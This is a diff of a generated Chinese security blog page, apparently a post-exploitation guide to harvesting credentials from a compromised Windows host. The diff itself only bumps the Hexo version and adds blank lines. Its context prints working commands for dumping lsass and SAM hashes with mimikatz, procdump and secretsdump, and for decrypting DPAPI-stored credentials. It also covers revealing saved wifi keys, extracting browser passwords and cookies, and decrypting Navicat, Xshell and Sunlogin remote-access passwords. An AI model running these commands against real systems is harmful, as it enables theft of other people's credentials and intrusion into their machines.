@@ -29,7 +29,7 @@
 
     <script src="/libs/jquery/jquery.min.js"></script>
 
-<meta name="generator" content="Hexo 5.3.0">
+<meta name="generator" content="Hexo 5.4.0">
 <style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
 <link rel="alternate" href="/atom.xml" title="Ex1t" type="application/atom+xml">
 </head>
@@ -439,23 +439,29 @@
 <pre class="line-numbers language-none"><code class="language-none">privilege::debug
 sekurlsa::logonpasswords
 mimikatz.exe "sekurlsa::debug" "sekurlsa::logonPasswords"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>(2)导出lsass进程的内存文件</p>
 <p>可能有waf上传不上去，通过procdump来导出lsass进程的内存文件。</p>
 <pre class="line-numbers language-none"><code class="language-none">procdump64.exe  -accepteula -ma lsass.exe lsass.dmp  #导出为lsass.dump文件
 mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswordsfull" exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>(3)注册表导出</p>
 <pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SYSTEM system.hiv
 reg save HKLM\SAM sam.hiv
 reg save hklm\security security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <pre class="line-numbers language-none"><code class="language-none">mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>或使用<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
 <pre class="line-numbers language-none"><code class="language-none">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//impacket.png" alt="impacket"></p>
 <h3 id="2-2-2、抓取其他的登录凭据"><a href="#2-2-2、抓取其他的登录凭据" class="headerlink" title="2.2.2、抓取其他的登录凭据"></a>2.2.2、抓取其他的登录凭据</h3><pre class="line-numbers language-none"><code class="language-none">#查看mstsc的连接纪录
 cmdkey /list 
 
 #查找本地的Credentials：
 dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p> 存在很多登录凭据</p>
 <p> <img src="https://img.ex1t.xyz//cmdkey.png" alt="cmdkey"></p>
 <p>#查找本地的Credentials：</p>
@@ -464,20 +470,24 @@ dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="tru
 <p>管理员权限运行mimikatz.exe </p>
 <pre class="line-numbers language-none"><code class="language-none">"privilege::debug" 
 dpapi::cred  /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\BF79E68DD4C78FB8BE8B2C6D69CFBEA7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//apapi.png" alt="apapi"></p>
 <p>执行找到guidMasterKey值对应的guid下的MasterKer值</p>
 <pre class="line-numbers language-none"><code class="language-none">mimikatz.exe 
 "privilege::debug" 
 "sekurlsa::dpapi" &gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="https://img.ex1t.xyz//apapi-2.png" alt="apapi-2"></p>
 <p>得到MasterKey</p>
 <pre class="line-numbers language-none"><code class="language-none">mimikatz.exe
  "dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\BF79E68DD4C78FB8BE8B2C6D69CFBEA7 /masterkey:2a1761e64cf86ad5447ffa4ae7ea4f19f9c9c4acd56a9cf815f9d5a0be6dc5cc5aa044f47f704cdca9082661dba3f74f3a5fc77cc67957abbf1a2e944e3d656b"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>成功得到我的gitee的账号密码</p>
 <p><img src="https://img.ex1t.xyz//apapi-3.png" alt="apapi-3"></p>
 <h3 id="2-3-3、wifi密码"><a href="#2-3-3、wifi密码" class="headerlink" title="2.3.3、wifi密码"></a>2.3.3、wifi密码</h3><p>用的比较少，但还是提一下</p>
 <p>批量显示wifi账号密码</p>
 <pre class="line-numbers language-none"><code class="language-none">for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
 
 <h2 id="2-3、浏览器账号密码"><a href="#2-3、浏览器账号密码" class="headerlink" title="2.3、浏览器账号密码"></a>2.3、浏览器账号密码</h2><h3 id="2-3-1、浏览器各类文件地址"><a href="#2-3-1、浏览器各类文件地址" class="headerlink" title="2.3.1、浏览器各类文件地址"></a>2.3.1、浏览器各类文件地址</h3><h4 id="（1）、google"><a href="#（1）、google" class="headerlink" title="（1）、google"></a>（1）、google</h4><pre class="line-numbers language-none"><code class="language-none">书签：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Bookmarks 
@@ -486,6 +496,7 @@ Cookie: C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cookies
 当前的session：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Current 
 Session 账号密码：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Login 
 Data C:\Users\xx\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h4 id="（2）、QQ浏览器"><a href="#（2）、QQ浏览器" class="headerlink" title="（2）、QQ浏览器"></a>（2）、QQ浏览器</h4><pre class="line-numbers language-none"><code class="language-none">⽤户数据⽬录：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default 
 缓存⽬录：C:\Users\xx\AppData\Local\Google\Chrome\User Data\Default\Cache\ 
 各⽂件如下： 
@@ -494,17 +505,24 @@ Data C:\Users\xx\AppData\Local\Google\Chrome\User Data\Profile 1\Login Data<span
 当前的session：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Current 
 Session 账号密码：C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\Login 
 Data 或 C:\Users\xx\AppData\Local\Tencent\QQBrowser\User Data\Default\xxxxxxxxxxx\6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h4 id="（3）、360浏览器"><a href="#（3）、360浏览器" class="headerlink" title="（3）、360浏览器"></a>（3）、360浏览器</h4><pre class="line-numbers language-none"><code class="language-none">账号密码⽂件：C:\Users\xx\AppData\Roaming\360se6\User 
 Data\Default\apps\LoginAssis\assis2.db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h4 id="（4）、Firefox"><a href="#（4）、Firefox" class="headerlink" title="（4）、Firefox"></a>（4）、Firefox</h4><pre class="line-numbers language-none"><code class="language-none">账号密码⽂件：
  C:\Users\xx\AppData\Roaming\Mozilla\Firefox\Profiles\7s5izkwl.defaultrelease\logins.json<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h4 id="（5）、IE-Edge"><a href="#（5）、IE-Edge" class="headerlink" title="（5）、IE/Edge"></a>（5）、IE/Edge</h4><pre class="line-numbers language-none"><code class="language-none">书签⽂件：C:\Users\13910\Favorites\xx.url<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <h3 id="2-3-2、浏览器账号密码提取"><a href="#2-3-2、浏览器账号密码提取" class="headerlink" title="2.3.2、浏览器账号密码提取"></a>2.3.2、浏览器账号密码提取</h3><pre class="line-numbers language-none"><code class="language-none">https://github.com/moonD4rk/HackBrowserData<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>windows/mac/linux都可以进行提取</p>
 <pre class="line-numbers language-none"><code class="language-none">.\hack-browser-data.exe -h
 .\hack-browser-data.exe -b all -f json --dir results -cc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>运行后会生成</p>
 <pre class="line-numbers language-none"><code class="language-none">results/archive.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>打开就有</p>
 <p>存在cookie、password等</p>
 <p> <img src="https://img.ex1t.xyz//hack-1.png" alt="hack-1"></p>
@@ -655,23 +673,28 @@ $navicatPassword = new NavicatPassword(11);
 $decode = $navicatPassword-&gt;decrypt('E75BF077AB8BAA3AC2D5');
 echo $decode."\n";
 ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="2-5-2、Xshell"><a href="#2-5-2、Xshell" class="headerlink" title="2.5.2、Xshell"></a>2.5.2、Xshell</h3><p>存放地址</p>
 <pre class="line-numbers language-none"><code class="language-none">XShell5		%userprofile%\Documents\NetSarang\Xshell\Sessions
 XFtp5		%userprofile%\Documents\NetSarang\Xftp\Sessions
 XShell6		%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions
 XFtp6		%userprofile%\Documents\NetSarang Computer\6\Xftp\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p> <img src="https://img.ex1t.xyz//xshell.png" alt="xshell"></p>
 <p>文本中存放的Password就是加密后的密文</p>
 <p>解密脚本：</p>
 <pre class="line-numbers language-none"><code class="language-none">https://github.com/HyperSine/how-does-Xmanager-encrypt-password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <pre class="line-numbers language-none"><code class="language-none">xshell解密：
 python3 XShellCryptoHelper.py -d -ver 6.0 lQilxEugvLFfghR5tNV3K9DKhmwArV+SbjWAcgZZzIDTnJ0JgCo=
 xftp解密：
 python3 XFtpCryptoHelper.py  -d -ver 6.0 xxxx/xxxxx=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <h3 id="2-5-3、向日葵"><a href="#2-5-3、向日葵" class="headerlink" title="2.5.3、向日葵"></a>2.5.3、向日葵</h3><pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\Oray\SunLogin\SunloginClient\SunloginClient.exe
 向日葵默认配置文件路径：
 安装版：C:\Program Files\Oray\SunLogin\SunloginClient\config.ini
 便携版(绿色版)：C:\ProgramData\Oray\SunloginClient\config.ini<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>读取配置文件[config.ini]</p>
 <pre class="line-numbers language-none"><code class="language-none">[base]installautorun=nowindowuserpwd=0configpath=C:\Program Files (x86)\Oray\SunLogin\SunloginClient\config.initracksvr=encrypwd=SxudeIOP2vs=macaddress=20:F1:7C:B2:F3:12hasuu=0showupdatetip=1hostname=defaulthostdesc=level=levelname=levelchanel=istransfer=ismessage=expires=skin=sunlogincode=isfastcodelogin=1logintype=0license=01ad-c92c-eec3-ee58licensepsw=fastcode=k107xxxxxxfastcodepsw=etXDq1sXsrFkESG0RNxxxxxxxxxsunloginserver=rc10-fc05.oray.com:443slapiserver=slapi.oray.netaccount=language=0firstrun=0lastview=1openeyes=1screenshots_path=C:\Users\Administrator\Documents\Sunlogin Files[common]serviceonly=0autorun=1
 在ini中存在这两个关键字段
@@ -680,10 +703,13 @@ fastcode=xxxxxxxxxxfastcodepsw=xxxxxxxxxxxxxxxxxxxxxxx
 fastcode为本机识别码
 encry_pwd为本机验证码但被加密
 解密encry_pwd，便可得出向日葵远程连接密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>解密脚本</p>
 <pre class="line-numbers language-none"><code class="language-none">https://github.com/wafinfo/Sunflower_get_Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <pre class="line-numbers language-none"><code class="language-none">python3 SunDecrypt.py 
 输入密文即可<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <h3 id="2-5-4、TeamViewer"><a href="#2-5-4、TeamViewer" class="headerlink" title="2.5.4、TeamViewer"></a>2.5.4、TeamViewer</h3><p>这个用T00ls上的getTVpass.exe即可，就不多说了</p>
 <h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>暂时想到的就这多了，各位大佬有什么新的想法欢迎提出。</p>
 <p>如果本文章中存在什么问题，也敬请指正。关于文章中包含工具我已全部下载，若需要，可在公众号（诚默的每周学习总结）回复关键词：信息收集-windows，得到下载地址。</p>
